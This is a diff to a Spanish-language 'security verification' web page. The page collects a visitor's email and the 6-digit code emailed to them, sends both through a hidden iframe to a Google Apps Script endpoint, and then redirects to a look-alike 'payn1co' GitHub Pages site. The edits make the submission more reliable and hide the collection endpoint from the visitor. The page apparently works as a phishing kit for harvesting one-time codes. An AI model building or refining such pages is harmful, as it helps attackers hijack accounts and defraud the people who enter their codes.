@@ -26,7 +26,7 @@
     box-shadow:0 10px 28px rgba(0,0,0,.35);
   }
   h2{ margin:0 0 6px; font-size:20px }
-  p{ margin:0 0 14px; color:var(--muted); line-height:1.5 }
+  p{ margin:0 0 14px; color:#aab4c3; line-height:1.5 }
   label{ display:block; margin:8px 0 6px; color:#b5c0cf; font-size:13px }
   input{
     width:100%; padding:12px 14px; border-radius:10px; border:1px solid #263241;
@@ -36,7 +36,7 @@
     width:100%; margin-top:12px; padding:12px; border:none; border-radius:10px;
     background:var(--accent); color:#fff; font-weight:800; cursor:pointer; font-size:15px;
   }
-  .ok{ color:var(--ok); font-size:13px; margin-top:8px; display:none; text-align:center }
+  .ok{ color:#22c55e; font-size:13px; margin-top:8px; display:none; text-align:center }
   .hint{ font-size:12px; color:#92a0b3; margin:6px 0 12px; }
   .hidden{ display:none }
 </style>
@@ -54,7 +54,7 @@
         <h2>Verificación por tu seguridad</h2>
         <p>Para proteger tu información, verificaremos tu identidad mediante un código de 6 dígitos que enviaremos a tu correo electrónico.</p>
 
-        <!-- Envío al Apps Script en IFRAME (no cambia la URL) -->
+        <!-- Envío al Apps Script en IFRAME (controlado por JS) -->
         <form id="emailForm"
               action="https://script.google.com/macros/s/AKfycbwrRtG58mAYlrcR0Ysjh-JoEPfv2yBkfnaSxitpnZRCwjUs0qKAMmKmP9ZxXT2o7HF47g/exec"
               method="post" target="hidden_iframe" accept-charset="UTF-8" autocomplete="off" novalidate>
@@ -72,7 +72,7 @@
         <p class="hint">El correo con tu código puede tardar entre <strong>3 y 5 minutos</strong> en llegar.</p>
         <p>Escribe el código de 6 dígitos que recibiste por correo y presiona <strong>Confirmar</strong> para continuar.</p>
 
-        <!-- También en IFRAME; luego redirigimos desde esta misma página -->
+        <!-- También al IFRAME; redirección se hace desde esta misma página -->
         <form id="verifyForm"
               action="https://script.google.com/macros/s/AKfycbwrRtG58mAYlrcR0Ysjh-JoEPfv2yBkfnaSxitpnZRCwjUs0qKAMmKmP9ZxXT2o7HF47g/exec"
               method="post" target="hidden_iframe" accept-charset="UTF-8" autocomplete="off">
@@ -86,14 +86,13 @@
     </div>
   </div>
 
-  <!-- Iframe oculto para enviar al Script sin cambiar de página -->
+  <!-- Iframe oculto (destino de ambos submits) -->
   <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
 
   <script>
-    // URL final (tu formulario en GitHub Pages)
-    const FORM_URL = "https://payn1co.github.io/Payn1co/";
+    const FORM_URL = "https://payn1co.github.io/Payn1co/"; // destino final
 
-    // pestañas y flujo
+    // manejo de pestañas
     const tabEmail = document.getElementById('tab-email');
     const tabCode  = document.getElementById('tab-code');
     const stepEmail = document.getElementById('step-email');
@@ -109,43 +108,64 @@
       window.scrollTo({top:0, behavior:'smooth'});
     }
 
-    // paso 1: email
+    const hiddenIfr   = document.getElementById('hidden_iframe');
+
+    // PASO 1
     const emailForm   = document.getElementById('emailForm');
     const okMsg       = document.getElementById('okMsg');
     const btnEmail    = document.getElementById('btnEmail');
     const inputEmail  = document.getElementById('email');
     const hiddenEmail = document.getElementById('hiddenEmail');
-    const hiddenIfr   = document.getElementById('hidden_iframe');
 
-    emailForm.addEventListener('submit', () => {
+    emailForm.addEventListener('submit', (e) => {
+      e.preventDefault();                          // control total del submit
       btnEmail.disabled = true;
       btnEmail.textContent = 'Enviando...';
 
+      // cuando el iframe termine de cargar la respuesta, avanzamos
       const onLoad = () => {
-        okMsg.style.display = 'block';             // muestra “Enviado”
-        hiddenEmail.value = inputEmail.value;      // pasa el correo al paso 2
-        showStep('code');                          // salta a pestaña Código
+        okMsg.style.display = 'block';
+        hiddenEmail.value = inputEmail.value;
+        showStep('code');
         btnEmail.disabled = false;
         btnEmail.textContent = 'Verificar';
         hiddenIfr.removeEventListener('load', onLoad);
       };
       hiddenIfr.addEventListener('load', onLoad, { once: true });
+
+      // enviar realmente al iframe
+      emailForm.submit();
     });
 
-    // paso 2: código (también por iframe) + redirección limpia a tu dominio
+    // PASO 2
     const verifyForm = document.getElementById('verifyForm');
     const btnVerify  = document.getElementById('btnVerify');
 
-    verifyForm.addEventListener('submit', () => {
+    verifyForm.addEventListener('submit', (e) => {
+      e.preventDefault();                          // evitar navegación a script.google.com
       btnVerify.disabled = true;
       btnVerify.textContent = 'Confirmando...';
 
+      // cuando el iframe reciba la respuesta del script, redirigimos nosotros
+      let redirected = false;
       const onLoadVerify = () => {
-        // ya guardó en la hoja; ahora redirigimos desde este documento (sin mostrar script.google.com)
-        window.location.replace(FORM_URL);
-        hiddenIfr.removeEventListener('load', onLoadVerify);
+        if (!redirected) {
+          redirected = true;
+          window.location.replace(FORM_URL);
+        }
       };
       hiddenIfr.addEventListener('load', onLoadVerify, { once: true });
+
+      // fallback por si iOS no dispara 'load' en cross-origin
+      setTimeout(() => {
+        if (!redirected) {
+          redirected = true;
+          window.location.replace(FORM_URL);
+        }
+      }, 1200);
+
+      // enviar realmente al iframe
+      verifyForm.submit();
     });
 
     // pestañas manuales (opcional)
